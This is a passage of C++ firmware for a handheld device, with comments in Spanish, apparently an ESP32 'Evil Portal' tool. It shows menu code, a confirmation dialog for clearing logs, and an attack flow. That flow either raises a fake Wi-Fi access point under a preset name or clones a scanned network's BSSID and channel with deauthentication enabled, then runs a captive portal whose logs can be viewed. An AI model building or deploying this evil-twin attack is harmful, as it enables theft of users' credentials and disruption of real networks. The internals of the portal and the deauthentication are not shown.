                showLogDetail(log);
                draw();
            }
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIRMAR BORRAR LOGS
// ═══════════════════════════════════════════════════════════════════════════

static bool confirmClearLogs() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);

    drawCenteredTitle("CONFIRMAR", 20, TFT_RED, 2);
    tft.drawFastHLine(0, 60, 320, TFT_RED);

    drawStringCustom(30, 90,  "Borrar TODOS los logs?", UI_MAIN, 2);
    drawStringCustom(30, 120, "Esta accion no se puede",  UI_ACCENT, 1);
    drawStringCustom(30, 132, "deshacer.",                UI_ACCENT, 1);

    tft.drawFastHLine(0, 210, 320, TFT_RED);
    drawStringCustom(10, 220, "OK: SI BORRAR   UP/DN: CANCELAR", UI_ACCENT, 1);

    while (true) {
        if (navEnterPressed()) {
            beep(1200, 80);
            while (navEnterPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navUpPressed() || navDownPressed()) {
            beep(2000, 40);
            while (navUpPressed() || navDownPressed()) delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  FLOW DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════

static void startAttackFlow() {
    int mode = selectMode();
    if (mode < 0) return;

    if (mode == 0) {
        int ssidIdx = selectPresetSSID();
        if (ssidIdx < 0) return;
        g_cloneMode = false;
        g_doDeauth = false;
        if (!startPortal(String(PRESET_SSIDS[ssidIdx]), 6)) {
            tft.fillScreen(TFT_BLACK);
            drawStringBig(30, 100, "FAILED TO START AP", TFT_RED, 1);
            delay(2000);
            return;
        }
    } else {
        scanForClone();
        if (scanAPCount == 0) {
            tft.fillScreen(TFT_BLACK);
            drawStringBig(30, 100, "NO NETWORKS FOUND", TFT_RED, 1);
            delay(2000);
            return;
        }
        int cloneIdx = selectCloneTarget();
        if (cloneIdx < 0) return;

        g_cloneMode = true;
        g_doDeauth = true;
        memcpy(g_cloneBSSID, scanAPs[cloneIdx].bssid, 6);
        g_cloneChannel = scanAPs[cloneIdx].channel;

        if (!startPortal(scanAPs[cloneIdx].ssid, g_cloneChannel)) {
            tft.fillScreen(TFT_BLACK);
            drawStringBig(30, 100, "FAILED TO START AP", TFT_RED, 1);
            delay(2000);
            return;
        }
    }

    runPortalLoop();
}

// ═══════════════════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════

void runEvilPortal() {
    while (navEnterPressed()) delay(5);
    delay(100);

    if (!showDisclaimer()) return;

    while (true) {
        int choice = selectMainMenu();
        switch (choice) {
            case -1:
                return;
            case 0:
                startAttackFlow();
                break;
            case 1:
                viewLogs();
                break;
            case 2:
                if (confirmClearLogs()) {
                    portalLogClear();
                    beep(1500, 100); delay(50);
                    beep(1200, 100);
                }
                break;
            case 3:
                return;
        }
    }
}
